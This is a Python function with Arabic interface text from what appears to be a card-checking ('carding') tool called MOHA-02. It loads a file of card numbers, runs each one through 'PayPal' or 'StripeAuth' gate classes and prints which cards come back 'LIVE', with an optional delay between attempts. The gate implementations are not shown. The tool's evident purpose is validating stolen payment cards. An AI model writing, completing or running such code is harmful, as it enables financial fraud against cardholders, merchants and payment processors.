def run_checker(gate_type):
    show_banner()
    console.print(f"[{C.neon_cyan}]بدء الفحص باستخدام: {gate_type}[/{C.neon_cyan}]")
    file_path = input(f"{C.lcyan} ╭─مسار ملف البطاقات: {C.lgreen}$ {C.reset}").strip()
    
    if not os.path.exists(file_path):
        console.print(f"[{C.fail_red}]الملف غير موجود![/{C.fail_red}]")
        time.sleep(2)
        return

    with open(file_path, 'r') as f:
        cards = [line.strip() for line in f if line.strip()]

    stats = Statistics()
    stats.start()
    adv = load_advanced_settings()

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=None, style="black", complete_style="green"),
        TaskProgressColumn(),
        console=console,
        transient=True
    ) as progress:
        task = progress.add_task(f"[white]جاري الفحص...", total=len(cards))
        
        for card in cards:
            try:
                if gate_type == "PayPal":
                    checker = PayPal(card)
                    result = checker.Main()
                else:
                    checker = StripeAuth(card)
                    result = checker.Main()
                
                stats.update(result, card)
                
                res_color = C.success_green if "LIVE" in result else C.fail_red
                console.print(f"[{C.lcyan}MOH{C.lcyan}] {card} -> [{res_color}]{result}[/{res_color}]")
                
                if adv['delay'] > 0:
                    time.sleep(adv['delay'])
                    
            except Exception as e:
                console.print(f"[{C.fail_red}]خطأ في البطاقة: {str(e)[:20]}[/{C.fail_red}]")
            
            progress.update(task, advance=1)

    stats.display_final(f"MOHA-02 {gate_type}", file_path)
    input(f"\n{C.lyellow}اضغط Enter للعودة للقائمة...{C.reset}")

